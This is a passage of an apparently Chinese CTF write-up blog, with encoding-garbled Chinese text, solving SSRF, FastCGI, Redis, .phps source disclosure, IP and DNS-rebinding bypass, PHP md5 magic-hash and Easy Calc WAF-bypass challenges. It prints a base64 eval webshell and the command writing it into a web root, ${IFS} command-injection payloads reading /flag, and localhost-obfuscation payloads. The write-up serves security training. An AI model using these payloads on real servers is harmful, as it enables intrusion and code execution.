class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">echo</span> getenv(<span class="hljs-string">&quot;CTFHUB&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Upload Webshellï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/flag.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>  <span class="hljs-comment">&lt;!-- è¿™é‡Œåœ¨htmlè¡¨å•é‡Œå†åŠ ä¸€è¡Œfileæ¢æˆsubmit å¢åŠ ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„æŒ‰é’® --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ æŠ“åŒ…æ”¹åŒ…å’Œä¸Šä¸€é¢˜å·®ä¸å¤š ä½†ä¸éœ€è¦æ„é€ poståŒ…</p><h2 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h2><p>Fastcgiå…¶å®æ˜¯ä¸€ä¸ªé€šä¿¡åè®®ï¼Œå’ŒHTTPåè®®ä¸€æ ·ï¼Œéƒ½æ˜¯è¿›è¡Œæ•°æ®äº¤æ¢çš„ä¸€ä¸ªé€šé“ã€‚</p><p>HTTPåè®®æ˜¯æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¸­é—´ä»¶è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ï¼Œæµè§ˆå™¨å°†HTTPå¤´å’ŒHTTPä½“ç”¨æŸä¸ªè§„åˆ™ç»„è£…æˆæ•°æ®åŒ…ï¼Œä»¥TCPçš„æ–¹å¼å‘é€åˆ°æœåŠ¡å™¨ä¸­é—´ä»¶ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶æŒ‰ç…§è§„åˆ™å°†æ•°æ®åŒ…è§£ç ï¼Œå¹¶æŒ‰è¦æ±‚æ‹¿åˆ°ç”¨æˆ·éœ€è¦çš„æ•°æ®ï¼Œå†ä»¥HTTPåè®®çš„è§„åˆ™æ‰“åŒ…è¿”å›ç»™æœåŠ¡å™¨ã€‚</p><p>ç±»æ¯”HTTPåè®®æ¥è¯´ï¼Œfastcgiåè®®åˆ™æ˜¯æœåŠ¡å™¨ä¸­é—´ä»¶å’ŒæŸä¸ªè¯­è¨€åç«¯è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ã€‚Fastcgiåè®®ç”±å¤šä¸ªrecordç»„æˆï¼Œrecordä¹Ÿæœ‰headerå’Œbodyä¸€è¯´ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶å°†è¿™äºŒè€…æŒ‰ç…§fastcgiçš„è§„åˆ™å°è£…å¥½å‘é€ç»™è¯­è¨€åç«¯ï¼Œè¯­è¨€åç«¯è§£ç ä»¥åæ‹¿åˆ°å…·ä½“æ•°æ®ï¼Œè¿›è¡ŒæŒ‡å®šæ“ä½œï¼Œå¹¶å°†ç»“æœå†æŒ‰ç…§è¯¥åè®®å°è£…å¥½åè¿”å›ç»™æœåŠ¡å™¨ä¸­é—´ä»¶ã€‚</p><p>å’ŒHTTPå¤´ä¸åŒï¼Œrecordçš„å¤´å›ºå®š8ä¸ªå­—èŠ‚ï¼Œbodyæ˜¯ç”±å¤´ä¸­çš„contentLengthæŒ‡å®šï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">typedef struct &#123;<br>  /* Header */<br>  unsigned char version; // ç‰ˆæœ¬<br>  unsigned char type; // æœ¬æ¬¡recordçš„ç±»å‹<br>  unsigned char requestIdB1; // æœ¬æ¬¡recordå¯¹åº”çš„è¯·æ±‚id<br>  unsigned char requestIdB0;<br>  unsigned char contentLengthB1; // bodyä½“çš„å¤§å°<br>  unsigned char contentLengthB0;<br>  unsigned char paddingLength; // é¢å¤–å—å¤§å°<br>  unsigned char reserved;<br><br>  /* Body */<br>  unsigned char contentData[contentLength];<br>  unsigned char paddingData[paddingLength];<br>&#125; FCGI_Record;<br></code></pre></td></tr></table></figure><p>å¤´ç”±8ä¸ªucharç±»å‹çš„å˜é‡ç»„æˆï¼Œæ¯ä¸ªå˜é‡1å­—èŠ‚ã€‚å…¶ä¸­ï¼Œ<code>requestId</code>å ä¸¤ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªå”¯ä¸€çš„æ ‡å¿—idï¼Œä»¥é¿å…å¤šä¸ªè¯·æ±‚ä¹‹é—´çš„å½±å“ï¼›<code>contentLength</code>å ä¸¤ä¸ªå­—èŠ‚ï¼Œè¡¨ç¤ºbodyçš„å¤§å°ã€‚</p><p>è¯­è¨€ç«¯è§£æäº†fastcgiå¤´ä»¥åï¼Œæ‹¿åˆ°<code>contentLength</code>ï¼Œç„¶åå†åœ¨TCPæµé‡Œè¯»å–å¤§å°ç­‰äº<code>contentLength</code>çš„æ•°æ®ï¼Œè¿™å°±æ˜¯bodyä½“ã€‚</p><p>Bodyåé¢è¿˜æœ‰ä¸€æ®µé¢å¤–çš„æ•°æ®ï¼ˆPaddingï¼‰ï¼Œå…¶é•¿åº¦ç”±å¤´ä¸­çš„paddingLengthæŒ‡å®šï¼Œèµ·ä¿ç•™ä½œç”¨ã€‚ä¸éœ€è¦è¯¥Paddingçš„æ—¶å€™ï¼Œå°†å…¶é•¿åº¦è®¾ç½®ä¸º0å³å¯ã€‚</p><p>å¯è§ï¼Œä¸€ä¸ªfastcgi recordç»“æ„æœ€å¤§æ”¯æŒçš„bodyå¤§å°æ˜¯<code>2^16</code>ï¼Œä¹Ÿå°±æ˜¯65536å­—èŠ‚ã€‚</p><ul><li>åšé¢˜</li></ul><p>åˆ©ç”¨Gopherusç”Ÿæˆpayload</p><blockquote><p>å·²çŸ¥å­˜åœ¨çš„æ–‡ä»¶/var/www/html/index.php</p><p><strong>base64(<?php @eval($_POST['pass']);?>)=PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOz8+</strong></p><p>è¦æ‰§è¡Œçš„å‘½ä»¤echo <code>PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOz8+</code>|base64 -d &gt;/var/www/html/shell.php</p></blockquote><p>åŒä¸Šè½¬ç ä¸¤æ¬¡å³å¯</p><h2 id="Redisåè®®"><a href="#Redisåè®®" class="headerlink" title="Redisåè®®"></a>Redisåè®®</h2><p>å¼€æ”¾ç«¯å£6379</p><p>Gopherusç”Ÿæˆpayload è¿›è¡Œä¸¤æ¬¡è½¬ç  ç„¶åå°±åœ¨getä¼ å‚cmd=lsâ€¦â€¦ è²Œä¼¼è¦ç»•è¿‡ç©ºæ ¼</p><p><img src="https://img-blog.csdnimg.cn/20210423214036185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_16,color_FFFFFF,t_70#pic_center"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cmd</span>=ls<span class="hljs-variable">$&#123;IFS&#125;</span>/<br><span class="hljs-attr">cmd</span>=cat<span class="hljs-variable">$&#123;IFS&#125;</span>/flag<br></code></pre></td></tr></table></figure><p>ä¸åˆ©ç”¨è¯¥è„šæœ¬ è‡ªå·±å†™ä¸€ä¸ªredisåè®® å†™è¿›ä¸€å¥è¯ä¹Ÿå¯ä»¥ Gopherusç”Ÿæˆçš„payloadå¿…é¡»æ˜¯cmdä¼ å‚</p><h2 id="Training-Rebots"><a href="#Training-Rebots" class="headerlink" title="Training-Rebots"></a>Training-Rebots</h2><p>è®¿é—®ä¸€ä¸‹rebots.txtæ–‡ä»¶ æ ¹æ®å…è®¸å’Œä¸å…è®¸æŠ“åŒ…æ”¹åŒ…å³å¯</p><h2 id="Can-you-anthenticate-to-this-website"><a href="#Can-you-anthenticate-to-this-website" class="headerlink" title="Can you anthenticate to this website?"></a>Can you anthenticate to this website?</h2><p>é¦–å…ˆå¯ä»¥dirsearchæ‰«ä¸€ä¸‹è¦å¹²ä»€ä¹ˆ<br><img src="https://img-blog.csdnimg.cn/20210317212908628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>å¾ˆæ˜æ˜¾æ˜¯ç™»é™†æ“ä½œäº†<br>æˆ‘ä»¬æ²¡åŠæ³•ç›²ç›®åœ°ç™»å½• å¿…é¡»æŸ¥çœ‹åˆ°ç™»å½•æºç æ‰èƒ½è¿›å»ï¼Œè¿™é‡Œæ€»ç»“ä¸€ä¸‹å¦‚ä½•æŸ¥çœ‹æºç </p><p><strong>å¯¹ç½‘é¡µæºç çš„æŸ¥çœ‹æ–¹æ³•</strong></p><ol><li><p> å®¡æŸ¥å…ƒç´ çš„æ–¹å¼ å³å‡»æˆ–è€…F12</p></li><li><p> å³å‡»æŸ¥çœ‹é¡µé¢æºä»£ç æˆ–è€…urlå¼€å¤´å†™<code>view-source:</code>ä¹Ÿå¯ä»¥ctrl+u</p></li><li><p> phpsæ–‡ä»¶ç±»å‹ä¸»è¦ç”±phpç»„ä¸phpæºå…³è”ã€‚é€šå¸¸ï¼Œphpæ–‡ä»¶å°†ç”±webæœåŠ¡å™¨å’Œphpå¯æ‰§è¡Œæ–‡ä»¶è§£é‡Š(åœ¨æœåŠ¡å™¨æ³¨å†Œè¿‡çš„MIMEç±»å‹çš„æ–‡ä»¶)ï¼Œç½‘ç«™è®¿é—®è€…çœ‹ä¸åˆ°phpæ–‡ä»¶ä»£ç ã€‚å¦‚æœå°†æ–‡ä»¶æ‰©å±•åè®¾ä¸º.phpsï¼ŒæœåŠ¡å™¨é…ç½®æ­£ç¡® å°†ä¼šè¾“å‡ºæºä»£ç çš„å½©è‰²æ ¼å¼ç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯ç”Ÿæˆçš„HTMLã€‚</p></li><li><p>åˆ©ç”¨phpä¼ªåè®®<code>php://filter</code><br> é‚£ä¹ˆæ­¤é¢˜çš„å°±æ˜¯ç”¨åˆ°<code>.phps</code>è§£å¼€æ­¤é¢˜<br> ä¸Šé¢dirsearchå¹¶æœªå‘ç°è¿™ä¸ªæ–‡ä»¶ æ˜¯è„šæœ¬çˆ†ç ´çš„é—®é¢˜ å¯ä»¥å‘å­—å…¸é‡Œé¢æ·»åŠ è§„åˆ™ åœ¨dirsearch/dbä¸‹çš„dicc.txt åœ¨index.phpä¸‹æ·»åŠ ä¸€æ¡index.phpså³å¯<br> <img src="https://img-blog.csdnimg.cn/20210317221647640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br> æŸ¥çœ‹æºç ï¼š<img src="https://img-blog.csdnimg.cn/20210317221810408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">å‘ç°é‡Œè¾¹é¦–å…ˆurlè§£ç GETå¾—åˆ°çš„å­—ç¬¦ä¸² æ¾æ•£æ¯”è¾ƒç­‰äº<code>&quot;admin&quot;</code> æ„é€ <code>id=admin</code></p></li></ol><h2 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h2><p><img src="https://img-blog.csdnimg.cn/20210423211244499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>å¸¸è§çš„ç¬¦å·ç»•è¿‡æœ‰ @ # / \ ? å¤šè¯•ä¸€è¯•ã€‚ã€‚</p><h2 id="IP-Bypass"><a href="#IP-Bypass" class="headerlink" title="IP Bypass"></a>IP Bypass</h2><p>127.0.0.1ä½¿ç”¨çš„æ˜¯ç‚¹åˆ†åè¿›åˆ¶ ç»•è¿‡å¦‚ä¸‹</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">8</span>è¿›åˆ¶æ ¼å¼ï¼š<span class="hljs-number">0177.00.00</span>.<span class="hljs-number">01</span><br><br><span class="hljs-number">16</span>è¿›åˆ¶æ ¼å¼ï¼š<span class="hljs-number">0</span>x7f.<span class="hljs-number">0x0.0x0</span>.<span class="hljs-number">0</span>x1<br><br><span class="hljs-number">10</span>è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š<span class="hljs-number">2130706433</span><br><br>ç‰¹åˆ«çš„ï¼Œåœ¨linuxä¸‹ï¼Œ<span class="hljs-number">0</span>ä»£è¡¨<span class="hljs-number">127.0.0.1</span>ï¼Œå¯ä»¥ç”¨http://<span class="hljs-number">0</span>è¿›è¡Œè¯·æ±‚<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>8è¿›åˆ¶<br><img src="https://img-blog.csdnimg.cn/20210423211039257.png#pic_center"><br>16è¿›åˆ¶<br><img src="https://img-blog.csdnimg.cn/20210423211353222.png#pic_center"><br>10è¿›åˆ¶æ•´æ•°ï¼š<img src="https://img-blog.csdnimg.cn/20210423211439801.png#pic_center"><br>linuxï¼š<br><img src="https://img-blog.csdnimg.cn/20210423211503787.png#pic_center"></p><h2 id="302è·³è½¬-Bypass"><a href="#302è·³è½¬-Bypass" class="headerlink" title="302è·³è½¬ Bypass"></a>302è·³è½¬ Bypass</h2><p>SSRFä¸­æœ‰ä¸ªå¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯è¯·æ±‚å¯èƒ½ä¼šè·Ÿéš302è·³è½¬</p><p><img src="https://img-blog.csdnimg.cn/20210423211528881.png#pic_center"></p><h2 id="DNSé‡ç»‘å®š-Bypass"><a href="#DNSé‡ç»‘å®š-Bypass" class="headerlink" title="DNSé‡ç»‘å®š Bypass"></a>DNSé‡ç»‘å®š Bypass</h2><p>DNSæ¦‚å¿µç•¥</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">DNS</span> <span class="hljs-selector-tag">TTL</span><br><span class="hljs-selector-tag">TTL</span>å€¼å…¨ç§°æ˜¯â€œç”Ÿå­˜æ—¶é—´ï¼ˆ<span class="hljs-selector-tag">Time</span> <span class="hljs-selector-tag">To</span> <span class="hljs-selector-tag">Live</span>)â€ï¼Œç®€å•çš„è¯´å®ƒè¡¨ç¤º<span class="hljs-selector-tag">DNS</span>è®°å½•åœ¨<span class="hljs-selector-tag">DNS</span>æœåŠ¡å™¨ä¸Šç¼“å­˜æ—¶é—´ï¼Œæ•°å€¼è¶Šå°ï¼Œä¿®æ”¹è®°å½•å„åœ°ç”Ÿæ•ˆæ—¶é—´è¶Šå¿«ã€‚<br><br>å½“å„åœ°çš„<span class="hljs-selector-tag">DNS</span>(LDNS)æœåŠ¡å™¨æ¥å—åˆ°è§£æè¯·æ±‚æ—¶ï¼Œå°±ä¼šå‘åŸŸåæŒ‡å®šçš„æˆæƒ<span class="hljs-selector-tag">DNS</span>æœåŠ¡å™¨å‘å‡ºè§£æè¯·æ±‚ä»è€Œè·å¾—è§£æè®°å½•ï¼›è¯¥è§£æè®°å½•ä¼šåœ¨<span class="hljs-selector-tag">DNS</span>(LDNS)æœåŠ¡å™¨ä¸­ä¿å­˜ä¸€æ®µæ—¶é—´ï¼Œè¿™æ®µæ—¶é—´å†…å¦‚æœå†æ¥åˆ°è¿™ä¸ªåŸŸåçš„è§£æè¯·æ±‚ï¼Œ<span class="hljs-selector-tag">DNS</span>æœåŠ¡å™¨å°†ä¸å†å‘æˆæƒ<span class="hljs-selector-tag">DNS</span>æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›åˆšæ‰è·å¾—çš„è®°å½•ï¼›è€Œè¿™ä¸ªè®°å½•åœ¨<span class="hljs-selector-tag">DNS</span>æœåŠ¡å™¨ä¸Šä¿ç•™çš„æ—¶é—´ï¼Œå°±æ˜¯<span class="hljs-selector-tag">TTL</span>å€¼ã€‚<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨å·²ç»æ§åˆ¶çš„DNSæœåŠ¡å™¨ æ¶æ„DNSæœåŠ¡å™¨å°†TTLå€¼è®¾ç½®ä¸º1ç§’ å‘æŸ¥è¯¢åŸŸçš„æœºå™¨å“åº”çœŸå®çš„æ¶æ„IPåœ°å€ è®©å…¶ç¼“å­˜è¿…é€Ÿå¤±æ•ˆ ï¼ˆå¸¸å°†è®¿é—®çš„ç›®æ ‡IPç¯¡æ”¹ä¸ºå…·æœ‰æ”»å‡»æ€§çš„åœ°å€ï¼‰</p><p>å¯ä»¥è®©ç›®æ ‡æœºå™¨çš„æµè§ˆå™¨è®¿é—®æ¶æ„çš„ç½‘ç«™ è§£æå…¶æ¶æ„ä»£ç æ‰§è¡Œå¦‚js</p><p>ä¸‹é¢çš„å‡ ä¸ªç½‘ç«™éƒ½æ˜¯æµ‹è¯•è¿™ä¸ªDNSé‡ç»‘å®šæ¼æ´çš„</p><p><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a><br><img src="https://img-blog.csdnimg.cn/20210423211706570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">7</span>f000001<span class="hljs-selector-class">.c0a80001</span><span class="hljs-selector-class">.rbndr</span><span class="hljs-selector-class">.us</span> #payload<br></code></pre></td></tr></table></figure><p><a href="http://xip.io/">http://xip.io/</a></p><p><img src="https://img-blog.csdnimg.cn/20210423211753175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>.xip.io #payload<br></code></pre></td></tr></table></figure><p><a href="http://ceye.io/">http://ceye.io/</a></p><p>åé¢è·Ÿ/flag.php é¢˜è§£ï¼</p><h2 id="md5ç»•è¿‡-hashæ¯”è¾ƒç¼ºé™·"><a href="#md5ç»•è¿‡-hashæ¯”è¾ƒç¼ºé™·" class="headerlink" title="md5ç»•è¿‡(hashæ¯”è¾ƒç¼ºé™·)"></a>md5ç»•è¿‡(hashæ¯”è¾ƒç¼ºé™·)</h2><p>å› ä¸ºmd5çš„ç‰¹æ€§ å®ƒæœ‰ä¸¤ä¸ªæ¼æ´</p><ul><li>MD5åŠ å¯†åçš„å€¼è‹¥å¼€å¤´ä¸º0eçš„è¯ åˆ™è®¤ä¸ºMD5çš„å€¼ç›¸ç­‰</li></ul><p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ˜¯ ä½¿ç”¨**!=** å’Œ <strong>==<strong>æ¥æ¯”è¾ƒ ä¼šæŠŠæ¯ä¸€ä¸ª</strong>OE</strong>å¼€å¤´çš„å­—ç¬¦ä¸²éƒ½è§£é‡Šä¸º0ï¼ˆPHPçš„ç§‘å­¦è®¡æ•°æ³•ï¼‰</p><table><thead><tr><th align="center">å­—ç¬¦ä¸²</th><th align="center">MD5åŠ å¯†å€¼</th></tr></thead><tbody><tr><td align="center">QNKCDZO</td><td align="center">0e830400451993494058024219903391</td></tr><tr><td align="center">s878926199a</td><td align="center">0e545993274517709034328855841020</td></tr><tr><td align="center">s155964671a</td><td align="center">0e342768416822451524974117254469</td></tr><tr><td align="center">s214587387a</td><td align="center">0e848240448830537924465865611904</td></tr><tr><td align="center">s878926199a</td><td align="center">0e545993274517709034328855841020</td></tr><tr><td align="center">s1091221200a</td><td align="center">0e940624217856561557816327384675</td></tr><tr><td align="center">0e215962017</td><td align="center">0e291242476940776845150308577824</td></tr></tbody></table><table><thead><tr><th align="center">å­—ç¬¦ä¸²</th><th align="center">sha1åŠ å¯†å€¼</th></tr></thead><tbody><tr><td align="center">aaroZmOk</td><td align="center">0e66507019969427134894567494305185566735</td></tr><tr><td align="center">aaK1STfY</td><td align="center">0e76658526655756207688271159624026011393</td></tr><tr><td align="center">aaO8zKZF</td><td align="center">0e89257456677279068558073954252716165668</td></tr><tr><td align="center">aa3OFF9m</td><td align="center">0e36977786278517984959260394024281014729</td></tr></tbody></table><ul><li>MD5å‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„</li></ul><p>MD5()å’Œsha1()å¤„ç†æ•°ç»„éƒ½ä¼šè¿”å›NULL (a[]=1)</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>åŸé¢˜ï¼šBUU [BJDCTF2020]Easy MD5</p><blockquote><p>Hint:â€œselect * from â€˜adminâ€™ where password=â€™â€.md5($pass,true)â€â€˜â€</p></blockquote><p>ç‰¹æ®Šå­—ç¬¦ä¸²ï¼š<strong>ffifdyop</strong> <strong>129581926211651571912466741651878684928</strong></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>æŸ¥çœ‹æºç é¦–å…ˆçœ‹åˆ°<img src="https://raw.githubkil3rr/photocom/wo02ie/photo/main//2021/06/07/.png"></p><p>WAFä¸å¯çŸ¥ï¼Œç¨åå†å¤„ç†ï¼›APIä¸­æœ‰calc.phpï¼Œå°è¯•è®¿é—®ï¼ŒOKçš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#é»‘åå•è§£é‡Š</span><br><span class="hljs-string">/i</span> å¿½ç•¥å¤§å°å†™<br><span class="hljs-string">/m</span>å¤šè¡ŒæŸ¥æ‰¾<br><span class="hljs-string">/g</span>å…¨å±€åŒ¹é…å­—ç¬¦<br><span class="hljs-string">/gi</span>ï¼ˆ<span class="hljs-string">/ig</span>)å¿½ç•¥å¤§å°å†™å…¨å±€åŒ¹é…å­—ç¬¦<br></code></pre></td></tr></table></figure><p>æœ‰é»‘åå•ï¼Œéœ€è¦GETä¼ å‚numï¼Œå¯ä»¥çœ‹åˆ°æœ‰evalå‡½æ•°æ‰§è¡Œ$_str=$_GET[â€˜numâ€™]</p><p>ä¼ å‚è¯•ä¸€è¯•ï¼Œ<code>calc.php?num=1</code>ä¼ 1å¯ä»¥ï¼Œ<code>calc.php?num=phpinfo();</code>å‘ç°ä¼ ä¸è¿›å»ï¼Œè¿™é‡Œåº”è¯¥å°±æ˜¯WAFçš„é—®é¢˜äº†</p><ul><li>æ–¹æ³•ä¸€ã€åˆ©ç”¨å­—ç¬¦ä¸²çš„è§£æç‰¹æ€§</li></ul><p>å­¦ä¹ ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œå°±æ˜¯PHPçš„å­—ç¬¦ä¸²çš„è§£æç‰¹æ€§</p><p>phpåœ¨è§£æå­—ç¬¦ä¸²æ—¶ï¼Œéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå®ƒçš„å¤„ç†æœ‰ä¸¤ç§ï¼Œåˆ é™¤å˜é‡åå‰é¢çš„ç©ºæ ¼æˆ–è€…å°†ç©ºæ ¼å’Œå…¶ä»–å­—ç¬¦æ›¿æ¢æˆä¸‹åˆ’çº¿</p><table><thead><tr><th align="center">User input</th><th align="center">Decoded PHP</th><th align="center">variable name</th></tr></thead><tbody><tr><td align="center">%20foo_bar%00</td><td align="center">foo_bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%20bar%00</td><td align="center">foo bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%5bbar</td><td align="center">foo[bar</td><td align="center">foo_bar</td></tr></tbody></table><p>æ‰€ä»¥è¯´ç¢°åˆ°WAFè¿‡æ»¤å˜é‡é‡Œé¢çš„å­—æ¯å’Œéæ³•å­—ç¬¦æ—¶ å¯ä»¥è€ƒè™‘è¿™ä¸ªç‰¹æ€§ç»•è¿‡</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/123456.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604202438733.png"></p><p>æ³¨æ„ä¸€äº›ä¸èƒ½ä½¿ç”¨çš„å‡½æ•°ï¼Œç”¨var_dump()æ‰“å°scandir()å§</p><p>è¿™ä¸ªscandir()ä¹Ÿå¯ä»¥ä½¿ç”¨glob()</p><p><img 